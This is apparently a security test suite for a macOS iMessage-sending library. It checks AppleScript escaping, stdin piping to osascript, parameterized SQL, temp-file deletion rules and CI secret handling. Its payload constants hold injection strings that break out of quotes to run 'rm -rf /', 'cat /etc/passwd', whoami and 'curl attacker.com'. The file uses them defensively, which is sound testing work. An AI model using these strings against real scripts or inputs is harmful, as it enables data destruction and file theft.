/**
 * Security Injection Tests
 *
 * Comprehensive tests to verify AppleScript and Shell command injection prevention.
 * These tests ensure that user-controlled inputs are properly escaped before
 * being embedded into AppleScript templates or shell commands.
 *
 * CVE Reference: Issue #23 - AppleScript Injection via Unescaped File Paths / Recipients
 */

import { describe, expect, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { join } from 'node:path'
import {
    buildSendScript,
    escapeAppleScriptString,
    type ResolvedAttachment,
} from '../src/infra/outgoing/applescript-builder'

// Build a ResolvedAttachment stub from a path without touching the filesystem.
// Tests use synthetic paths (payloads); we compute needsBypass the same way
// inspectAttachment does and pass a fixed size.
const SAFE_DIRS = ['Pictures', 'Downloads', 'Documents'].map((d) => join(homedir(), d))
const attachmentFor = (path: string): ResolvedAttachment => ({
    localPath: path,
    needsBypass: !SAFE_DIRS.some((d) => path.startsWith(`${d}/`) || path === d),
})

// Local helpers — map legacy test signatures to buildSendScript
const generateSendTextScript = (id: string, text: string) => buildSendScript({ method: 'buddy', identifier: id, text })
const generateSendTextToChat = (id: string, text: string) => buildSendScript({ method: 'chat', identifier: id, text })
const generateSendAttachmentScript = (id: string, path: string) =>
    buildSendScript({ method: 'buddy', identifier: id, attachment: attachmentFor(path) })
const generateSendAttachmentToChat = (id: string, path: string) =>
    buildSendScript({ method: 'chat', identifier: id, attachment: attachmentFor(path) })
const generateSendWithAttachmentScript = (id: string, text: string, path: string) =>
    buildSendScript({ method: 'buddy', identifier: id, text, attachment: attachmentFor(path) })
const generateSendWithAttachmentToChat = (id: string, text: string, path: string) =>
    buildSendScript({ method: 'chat', identifier: id, text, attachment: attachmentFor(path) })

describe('Security: AppleScript Injection Prevention', () => {
    // ------------------------------------------------------------
    // Test Payloads - Known injection vectors
    // ------------------------------------------------------------
    const INJECTION_PAYLOADS = {
        // Double quote injection - breaks out of string context
        doubleQuote: 'test"injection',
        doubleQuoteComplex: 'file"; do shell script "whoami"; "',

        // Newline injection - breaks script structure
        newline: 'test\ninjection',
        newlineShell: 'test\n"; do shell script "rm -rf /"; "',

        // Carriage return injection
        carriageReturn: 'test\rinjection',

        // Tab injection
        tab: 'test\tinjection',

        // Backslash injection - escape sequence manipulation
        backslash: 'test\\injection',
        backslashQuote: 'test\\"injection',

        // Combined attack vectors
        combined1: '/tmp/evil"; rm -rf /; ".txt',
        combined2: 'bad"recipient\n"; do shell script "curl attacker.com"; "',
        combined3: 'chat"id"; do shell script "cat /etc/passwd"; "',

        // Path traversal + injection
        pathTraversal: '../../../etc/passwd"; do shell script "id',

        // Unicode and special chars (should pass through safely)
        unicode: '测试中文',
        emoji: '😀🎉',
        specialChars: '!@#$%^&*()',
    }

    // ------------------------------------------------------------
    // escapeAppleScriptString Tests
    // ------------------------------------------------------------
    describe('escapeAppleScriptString', () => {
        test('should escape double quotes', () => {
            const result = escapeAppleScriptString('test"value')
            expect(result).toBe('test\\"value')
            // The escaped string contains \" not raw "
            expect(result).toContain('\\"')
        })

        test('should escape backslashes', () => {
            const result = escapeAppleScriptString('test\\value')
            expect(result).toBe('test\\\\value')
        })

        test('should escape newlines', () => {
            const result = escapeAppleScriptString('test\nvalue')
            expect(result).toBe('test\\nvalue')
            expect(result).not.toContain('\n')
        })

        test('should escape carriage returns', () => {
            const result = escapeAppleScriptString('test\rvalue')
            expect(result).toBe('test\\rvalue')
            expect(result).not.toContain('\r')
        })

        test('should escape tabs', () => {
            const result = escapeAppleScriptString('test\tvalue')
            expect(result).toBe('test\\tvalue')
            expect(result).not.toContain('\t')
        })

        test('should handle multiple escape characters', () => {
            const input = 'test"\n\r\t\\end'
            const result = escapeAppleScriptString(input)
            expect(result).toBe('test\\"\\n\\r\\t\\\\end')
            // Verify raw control chars are escaped
            expect(result).not.toContain('\n')
            expect(result).not.toContain('\r')
            expect(result).not.toContain('\t')
        })

        test('should handle complex injection payload', () => {
            const result = escapeAppleScriptString(INJECTION_PAYLOADS.combined1)
            // Raw double quotes should be escaped
            expect(result).toContain('\\"')
            // Original payload with unescaped quotes should NOT match
            expect(result).not.toBe(INJECTION_PAYLOADS.combined1)
        })

        test('should preserve safe characters', () => {
            const safe = 'abcABC123!@#$%^&*()_+-=[]{}|:;<>,.?/'
            const result = escapeAppleScriptString(safe)
            // Only quotes need escaping in this string
            expect(result).toBe(safe)
        })

        test('should handle unicode characters', () => {
            const result = escapeAppleScriptString(INJECTION_PAYLOADS.unicode)
            expect(result).toBe(INJECTION_PAYLOADS.unicode)
        })

        test('should handle emoji', () => {
            const result = escapeAppleScriptString(INJECTION_PAYLOADS.emoji)
            expect(result).toBe(INJECTION_PAYLOADS.emoji)
        })

        test('should handle empty string', () => {
            expect(escapeAppleScriptString('')).toBe('')
        })
    })

    // ------------------------------------------------------------
    // generateSendTextScript Tests
    // ------------------------------------------------------------
    describe('generateSendTextScript', () => {
        test('should escape recipient with double quotes', () => {
            const script = generateSendTextScript(INJECTION_PAYLOADS.doubleQuote, 'hello')
            expect(script).not.toContain('test"injection')
            expect(script).toContain('test\\"injection')
        })

        test('should escape recipient with newlines', () => {
            const script = generateSendTextScript(INJECTION_PAYLOADS.newline, 'hello')
            expect(script).not.toContain('test\ninjection')
            expect(script).toContain('test\\ninjection')
        })

        test('should escape text with injection payload', () => {
            const script = generateSendTextScript('user', INJECTION_PAYLOADS.doubleQuoteComplex)
            expect(script).not.toContain('"; do shell script "whoami"')
        })

        test('should escape both recipient and text', () => {
            const script = generateSendTextScript(INJECTION_PAYLOADS.doubleQuote, INJECTION_PAYLOADS.newlineShell)
            expect(script).not.toContain('test"injection')
            expect(script).not.toContain('\n"; do shell script')
        })
    })

    // ------------------------------------------------------------
    // generateSendTextToChat Tests
    // ------------------------------------------------------------
    describe('generateSendTextToChat', () => {
        test('should escape chatId with double quotes', () => {
            const script = generateSendTextToChat(INJECTION_PAYLOADS.combined3, 'hello')
            expect(script).not.toContain('chat"id"')
            expect(script).toContain('chat\\"id\\"')
        })

        test('should escape chatId with shell injection', () => {
            const script = generateSendTextToChat(INJECTION_PAYLOADS.combined3, 'hello')
            expect(script).not.toContain('do shell script "cat /etc/passwd"')
        })
    })

    // ------------------------------------------------------------
    // generateSendAttachmentScript Tests
    // ------------------------------------------------------------
    describe('generateSendAttachmentScript', () => {
        test('should escape recipient with injection payload', () => {
            const script = generateSendAttachmentScript(INJECTION_PAYLOADS.combined2, '/tmp/safe.jpg')
            expect(script).not.toContain('bad"recipient')
            expect(script).not.toContain('do shell script "curl attacker.com"')
        })

        test('should escape file path with double quotes', () => {
            const script = generateSendAttachmentScript('user@example.com', INJECTION_PAYLOADS.combined1)
            expect(script).not.toContain('evil"; rm -rf /')
            expect(script).toContain('evil\\"')
        })

        test('should escape file path in sandbox bypass mode', () => {
            // Path not in Pictures/Downloads/Documents triggers sandbox bypass
            const maliciousPath = '/tmp/evil"; rm -rf /; ".txt'
            const script = generateSendAttachmentScript('user', maliciousPath)
            // Raw unescaped path should NOT appear verbatim
            expect(script).not.toContain(maliciousPath)
            // Escaped quotes should be present
            expect(script).toContain('evil\\"')
        })

        test('should AppleScript-escape the filename embedded in targetPath', () => {
            const script = generateSendAttachmentScript('user', '/tmp/bad"name.jpg')
            // The basename is embedded verbatim (no sanitization — filename is
            // preserved for the recipient) but AppleScript-escaped so the
            // surrounding string literal cannot be broken out of.
            expect(script).toContain('bad\\"name.jpg')
            expect(script).not.toMatch(/"[^"\\]*bad"name\.jpg/)
        })

        test('should isolate X characters from the mktemp template', () => {
            // The filename sits inside `tmpDir & "/..."`, while the mktemp
            // template uses only trailing X's. mktemp's trailing-X rule is
            // therefore immune to X's in the filename.
            const script = generateSendAttachmentScript('user', '/tmp/fileXXXname.png')
            expect(script).toMatch(/mktemp -d.*imsg_temp_XXXXXXXXXX/)
            expect(script).toContain('fileXXXname.png')
        })

        test('should preserve original filename verbatim (incl. non-ASCII)', () => {
            // Chinese / emoji / spaces / parentheses must reach the recipient
            // unchanged — no sanitization, no truncation, no transliteration.
            const script = generateSendAttachmentScript('user', '/tmp/我的文件 (副本).png')
            expect(script).toContain('我的文件 (副本).png')
        })

        test('should preserve compound extensions in filename', () => {
            const script = generateSendAttachmentScript('user', '/tmp/archive.tar.gz')
            expect(script).toContain('archive.tar.gz')
        })

        test('should preserve dotfile names', () => {
            const script = generateSendAttachmentScript('user', '/tmp/.hidden')
            expect(script).toContain('/.hidden')
        })
    })

    // ------------------------------------------------------------
    // generateSendAttachmentToChat Tests
    // ------------------------------------------------------------
    describe('generateSendAttachmentToChat', () => {
        test('should escape chatId with injection payload', () => {
            const script = generateSendAttachmentToChat(INJECTION_PAYLOADS.combined3, '/tmp/safe.jpg')
            expect(script).not.toContain('chat"id"')
            expect(script).not.toContain('do shell script "cat /etc/passwd"')
        })

        test('should escape file path with injection payload', () => {
            const script = generateSendAttachmentToChat('iMessage;-;+1234567890', INJECTION_PAYLOADS.combined1)
            expect(script).not.toContain('evil"; rm -rf /')
        })
    })

    // ------------------------------------------------------------
    // generateSendWithAttachmentScript Tests
    // ------------------------------------------------------------
    describe('generateSendWithAttachmentScript', () => {
        test('should escape recipient in main script', () => {
            const script = generateSendWithAttachmentScript(INJECTION_PAYLOADS.doubleQuote, 'hello', '/tmp/file.jpg')
            expect(script).not.toContain('test"injection')
            expect(script).toContain('test\\"injection')
        })

        test('should escape text content', () => {
            const script = generateSendWithAttachmentScript(
                'user',
                INJECTION_PAYLOADS.doubleQuoteComplex,
                '/tmp/file.jpg'
            )
            expect(script).not.toContain('"; do shell script "whoami"')
        })

        test('should escape all parameters together', () => {
            const script = generateSendWithAttachmentScript(
                INJECTION_PAYLOADS.combined2,
                INJECTION_PAYLOADS.doubleQuoteComplex,
                INJECTION_PAYLOADS.combined1
            )
            // None of the raw injection payloads should appear
            expect(script).not.toContain('bad"recipient')
            expect(script).not.toContain('"; do shell script "whoami"')
            expect(script).not.toContain('evil"; rm -rf /')
        })
    })

    // ------------------------------------------------------------
    // generateSendWithAttachmentToChat Tests
    // ------------------------------------------------------------
    describe('generateSendWithAttachmentToChat', () => {
        test('should escape chatId in main script', () => {
            const script = generateSendWithAttachmentToChat(INJECTION_PAYLOADS.combined3, 'hello', '/tmp/file.jpg')
            expect(script).not.toContain('chat"id"')
        })

        test('should escape all parameters together', () => {
            const script = generateSendWithAttachmentToChat(
                INJECTION_PAYLOADS.combined3,
                INJECTION_PAYLOADS.doubleQuoteComplex,
                INJECTION_PAYLOADS.combined1
            )
            // Raw unescaped payloads should NOT appear verbatim
            expect(script).not.toContain(INJECTION_PAYLOADS.combined3)
            expect(script).not.toContain(INJECTION_PAYLOADS.doubleQuoteComplex)
            expect(script).not.toContain(INJECTION_PAYLOADS.combined1)
            // Escaped quotes should be present
            expect(script).toContain('chat\\"id')
        })
    })

    // ------------------------------------------------------------
    // Regression Tests - Ensure raw payloads never appear
    // ------------------------------------------------------------
    describe('Regression: Raw payloads must never appear in scripts', () => {
        const dangerousPayloads = [
            '/tmp/evil"; rm -rf /; ".txt',
            'bad"recipient',
            'chat"id"; do shell script "whoami"; "',
            'test\n"; do shell script "curl attacker.com"; "',
        ]

        test.each(dangerousPayloads)('payload "%s" should not appear raw in any script', (payload) => {
            // Test in recipient position
            const script1 = generateSendTextScript(payload, 'text')
            expect(script1.includes(payload)).toBe(false)

            // Test in text position
            const script2 = generateSendTextScript('user', payload)
            expect(script2.includes(payload)).toBe(false)

            // Test in chatId position
            const script3 = generateSendTextToChat(payload, 'text')
            expect(script3.includes(payload)).toBe(false)

            // Test in filePath position (attachment)
            const script4 = generateSendAttachmentScript('user', payload)
            expect(script4.includes(payload)).toBe(false)
        })
    })
})

// ------------------------------------------------------------
// Security: osascript Execution Safety
// ------------------------------------------------------------
describe('Security: osascript Execution Safety', () => {
    test('execAppleScript should pipe script via stdin (no shell interpolation)', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-transport.ts', import.meta.url), 'utf-8')

        // Must use spawn with stdin piping — eliminates shell injection surface entirely
        expect(source).toContain("spawn('osascript', ['-']")
        expect(source).toContain('child.stdin?.write(script)')
        expect(source).toContain('child.stdin?.end()')

        // Must NOT use exec/execAsync with shell string interpolation
        expect(source).not.toMatch(/exec\(`osascript/)
        expect(source).not.toMatch(/execAsync\(`osascript/)
    })

    test('pgrep command should be hardcoded via execFile (no shell, no user input)', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-transport.ts', import.meta.url), 'utf-8')

        // pgrep should use execFileAsync with array arguments (no shell interpolation)
        expect(source).toMatch(/execFileAsync\s*\(\s*'pgrep'\s*,\s*\['-x',\s*'Messages'\]/)
    })
})

// ------------------------------------------------------------
// Security: SQL Injection Prevention
// ------------------------------------------------------------
describe('Security: SQL Injection Prevention', () => {
    test('query builders should use parameterized queries', () => {
        const source = readFileSync(new URL('../src/infra/db/macos26.ts', import.meta.url), 'utf-8')

        // Should use ? placeholders for parameters
        expect(source).toContain('params.push(')
        expect(source).toContain('= ?')

        // Query builder uses safe patterns: conditions are hardcoded strings
        // with ? placeholders, user values go through params.push()
        expect(source).toContain('conditions.push(')
        expect(source).toContain("conditions.join(' AND ')")
    })
})

// ------------------------------------------------------------
// Security: No Dangerous Functions
// ------------------------------------------------------------
describe('Security: No Dangerous Functions', () => {
    test('should not use eval()', () => {
        const files = [
            '../src/infra/outgoing/applescript-transport.ts',
            '../src/infra/outgoing/sender.ts',
            '../src/infra/db/reader.ts',
        ]

        for (const file of files) {
            const source = readFileSync(new URL(file, import.meta.url), 'utf-8')
            expect(source).not.toMatch(/\beval\s*\(/)
        }
    })

    test('should not use Function constructor for code execution', () => {
        const files = ['../src/infra/outgoing/applescript-transport.ts', '../src/infra/outgoing/sender.ts']

        for (const file of files) {
            const source = readFileSync(new URL(file, import.meta.url), 'utf-8')
            expect(source).not.toMatch(/new\s+Function\s*\(/)
        }
    })
})

// ------------------------------------------------------------
// Security: Source Code Audit
// ------------------------------------------------------------
describe('Security: Source Code Audit', () => {
    test('applescript.ts should escape all user inputs in sandbox bypass scripts', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-builder.ts', import.meta.url), 'utf-8')

        // Verify escapeAppleScriptString is exported
        expect(source).toContain('export function escapeAppleScriptString')

        // Verify escapedFilePath is used (for cat command)
        expect(source).toContain('const escapedFilePath = escapeAppleScriptString(localPath)')

        // Verify escapedId is used in the unified buildSendScript (covers both recipient and chatId)
        expect(source).toContain('const escapedId = escapeAppleScriptString(identifier)')

        // Note: escapedFileName is no longer needed since mktemp generates secure random names
    })

    test('no raw filePath in do shell script commands', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-builder.ts', import.meta.url), 'utf-8')

        // The pattern `"${filePath}"` should NOT appear in do shell script context
        // Instead, `"${escapedFilePath}"` should be used
        // Note: mktemp lines create empty files, cat lines copy content
        const doShellScriptLines = source.split('\n').filter((line) => line.includes('do shell script'))

        for (const line of doShellScriptLines) {
            expect(line).not.toContain('"${filePath}"')
            // Lines with cat should use escapedFilePath; mktemp lines don't need it
            if (line.includes('cat ')) {
                expect(line).toContain('${escapedFilePath}')
            }
        }
    })

    test('no raw recipient in buddy commands', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-builder.ts', import.meta.url), 'utf-8')

        // Find all code lines (not comments/docs) with `buddy "` pattern
        const buddyLines = source
            .split('\n')
            .filter(
                (line) =>
                    line.includes('buddy "') && !line.trimStart().startsWith('*') && !line.trimStart().startsWith('//')
            )

        for (const line of buddyLines) {
            // Should use escapedId (unified name for both recipient and chatId), not raw identifier
            expect(line).toContain('${escapedId}')
            expect(line).not.toMatch(/\$\{identifier\}/)
        }
    })
})

// ------------------------------------------------------------
// Security: Path Traversal Prevention
// ------------------------------------------------------------
describe('Security: Path Traversal Prevention', () => {
    test('temp-file-manager should only delete files with specific prefix', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/temp-files.ts', import.meta.url), 'utf-8')
        const domainSource = readFileSync(new URL('../src/domain/messages-app.ts', import.meta.url), 'utf-8')

        // Must check file prefix before deletion
        expect(source).toContain('startsWith(MESSAGES_APP_TEMP_FILE_PREFIX)')
        // The prefix constant is the single source of truth in domain/messages-app.ts
        expect(domainSource).toContain("export const MESSAGES_APP_TEMP_FILE_PREFIX = 'imsg_temp_'")
    })

    test('temp-file-manager should use join() for path construction', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/temp-files.ts', import.meta.url), 'utf-8')

        // Should use path.join() not string concatenation
        expect(source).toMatch(/join\(TEMP_DIR,\s*\w+\)/)
    })
})

// ------------------------------------------------------------
// Security: ReDoS (Regex Denial of Service) Prevention
// ------------------------------------------------------------
describe('Security: ReDoS Prevention', () => {
    test('regex patterns should not be vulnerable to catastrophic backtracking', () => {
        const source = readFileSync(new URL('../src/domain/validate.ts', import.meta.url), 'utf-8')

        // Check that regex patterns don't have nested quantifiers
        // Patterns like (a+)+ or (a|a)+ are vulnerable
        expect(source).not.toMatch(/\(\[.*\]\+\)\+/)
        expect(source).not.toMatch(/\(\.\*\)\+/)
    })

    test('escapeAppleScriptString regex should be safe', () => {
        const source = readFileSync(new URL('../src/infra/outgoing/applescript-builder.ts', import.meta.url), 'utf-8')

        // The escape regex should be a simple character class, not nested
        expect(source).toContain('/[\\\\\\n\\r\\t"]/g')
    })
})

// ------------------------------------------------------------
// Security: Null Byte Injection Prevention
// ------------------------------------------------------------
describe('Security: Null Byte Injection Prevention', () => {
    test('file paths should not allow null bytes', () => {
        // Test that null bytes in file paths are handled
        const maliciousPath = '/tmp/file\x00.txt'
        const script = generateSendAttachmentScript('user', maliciousPath)

        // The script should not break with null bytes
        expect(script).toBeDefined()
        expect(typeof script).toBe('string')
    })
})

// ------------------------------------------------------------
// Security: CRLF Injection Prevention
// ------------------------------------------------------------
describe('Security: CRLF Injection Prevention', () => {
    test('should escape CR and LF characters', () => {
        const crlfPayload = 'test\r\ninjection'
        const escaped = escapeAppleScriptString(crlfPayload)

        // Both CR and LF should be escaped
        expect(escaped).not.toContain('\r')
        expect(escaped).not.toContain('\n')
        expect(escaped).toContain('\\r')
        expect(escaped).toContain('\\n')
    })

    test('CRLF in recipient should be escaped', () => {
        const script = generateSendTextScript('user\r\ninjected', 'hello')
        expect(script).not.toContain('\r\n')
    })
})

// ------------------------------------------------------------
// Security: Input Validation
// ------------------------------------------------------------
describe('Security: Input Validation', () => {
    test('chatId validation should reject malicious input', () => {
        const chatIdSource = readFileSync(new URL('../src/domain/chat-id.ts', import.meta.url), 'utf-8')

        // ChatId.validate() is the authoritative chatId validation
        expect(chatIdSource).toContain('validate()')
        expect(chatIdSource).toContain('throw ConfigError')
    })

    test('content validation should exist', () => {
        // Canonical location is domain/validate.ts. Recipient shape is intentionally
        // not pre-validated locally — Messages.app is the authority. The only
        // enforced API-contract check is "text or attachment required".
        const source = readFileSync(new URL('../src/domain/validate.ts', import.meta.url), 'utf-8')

        expect(source).toContain('validateMessageContent')
        expect(source).toContain('SendError')
    })
})

// ------------------------------------------------------------
// Security: CI/CD Pipeline Audit
// ------------------------------------------------------------
describe('Security: CI/CD Pipeline Audit', () => {
    test('CI workflow should use pinned action versions for third-party actions', () => {
        const ci = readFileSync(new URL('../.github/workflows/ci.yml', import.meta.url), 'utf-8')

        // Should not use @master
        expect(ci).not.toContain('@master')
        // Third-party actions should use pinned versions
        expect(ci).toContain('@v2') // oven-sh/setup-bun
        expect(ci).toContain('@v5') // actions/checkout
        // buildspace blocks use @main (internal org, acceptable)
    })

    test('CI workflow should run lint and type-check', () => {
        const ci = readFileSync(new URL('../.github/workflows/ci.yml', import.meta.url), 'utf-8')

        expect(ci).toContain('type-check')
        expect(ci).toContain('lint')
    })

    test('release workflow should use secrets properly', () => {
        const release = readFileSync(new URL('../.github/workflows/release.yml', import.meta.url), 'utf-8')

        // Should use secrets, not hardcoded tokens
        expect(release).toContain('secrets.NPM_TOKEN')
        expect(release).toContain('secrets.OPENAI_API_KEY')
        expect(release).not.toMatch(/NPM_TOKEN\s*[:=]\s*['"][^$]/)
    })
})

// ------------------------------------------------------------
// Security: Example Files Audit
// ------------------------------------------------------------
describe('Security: Example Files Audit', () => {
    test('examples should not contain real credentials', () => {
        const examples = [
            '../examples/01-send-text.ts',
            '../examples/02-send-image.ts',
            '../examples/03-send-file.ts',
            '../examples/04-send-group.ts',
            '../examples/05-query-messages.ts',
            '../examples/06-list-chats.ts',
            '../examples/07-watch-messages.ts',
            '../examples/08-auto-reply.ts',
            '../examples/09-get-sent-message.ts',
            '../examples/10-plugin.ts',
            '../examples/11-error-handling.ts',
            '../examples/logger-plugin.ts',
        ]

        for (const file of examples) {
            const source = readFileSync(new URL(file, import.meta.url), 'utf-8')
            // Should not contain real phone numbers (10+ digit patterns that look real)
            expect(source).not.toMatch(/\+1[2-9]\d{9}/) // Real US numbers
            expect(source).not.toMatch(/[a-zA-Z0-9._%+-]+@(?!example\.com)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/) // Real emails (not example.com)
        }
    })
})
